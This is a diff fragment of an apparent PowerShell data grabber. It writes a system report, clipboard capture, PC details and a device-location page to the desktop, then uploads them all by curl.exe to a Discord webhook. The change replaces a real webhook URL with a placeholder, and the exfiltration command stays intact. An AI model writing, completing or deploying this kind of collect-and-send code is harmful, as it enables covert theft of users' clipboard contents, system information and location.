@@ -260,7 +260,7 @@ $HtmlContent | Out-File -Encoding utf8 $HtmlPath
 Write-Output "System report created on your Desktop as System_Report.txt"
 Write-Output "Google Maps location HTML created on your Desktop as DeviceLocation.html"
 
-$webhookuri = "https://discord.com/api/webhooks/1334995176321581166/3RoYJez5stb8LCsQx_4znANOdHR87FODSlI5kEXVYIwCgwT7-Cx9C-IertebeqnNC5kH"
+$webhookuri = "WEBHOOK_URI"
 
 curl.exe -F "file1=@$OutFile" -F "file2=@$OutFileClip" -F "file3=@$OutFilePC" -F "file4=@$HtmlPath" $webhookuri
 
